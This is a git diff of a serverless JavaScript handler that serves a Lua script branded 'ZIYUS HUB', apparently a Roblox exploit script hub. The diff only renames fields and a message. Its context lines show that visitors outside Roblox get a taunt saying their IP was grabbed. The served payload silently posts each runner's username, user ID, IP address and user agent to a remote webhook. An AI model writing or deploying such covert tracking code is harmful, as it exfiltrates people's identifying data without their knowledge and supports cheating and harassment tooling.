@@ -30,7 +30,7 @@ export default async function handler(req, res) {
       })
     }).catch(() => {});
 
-    return res.status(200).send(isRoblox ? "ANO I-FEFETCH MOPA? BOBOKA" : "SKIDDER DETECTED - IP LOGGED");
+    return res.status(200).send(isRoblox ? "ANO I-FEFETCH MOPA? BOBOKA" : "𝐙𝐈𝐘𝐔𝐒 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃 𝐘𝐎𝐔 𝐄𝐀𝐒𝐘 𝐈𝐏 𝐆𝐑𝐀𝐁𝐁𝐄𝐃 !");
   }
 
   const payload = `-- ZIYUS HUB
@@ -46,12 +46,12 @@ spawn(function()
                     Headers = {["Content-Type"] = "application/json"},
                     Body = game:GetService("HttpService"):JSONEncode({
                         embeds = {{
-                            title = "Script Executed",
+                            title = "Player Executed",
                             color = 65280,
                             fields = {
-                                {name = "Name", value = plr.Name},
+                                {name = "Username", value = plr.Name},
                                 {name = "UserID", value = tostring(plr.UserId)},
-                                {name = "IP", value = "${realIp}"},
+                                {name = "IP Address", value = "${realIp}"},
                                 {name = "User-Agent", value = "${userAgent.replace(/"/g, '\\"').slice(0,500)}"}
                             },
                             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
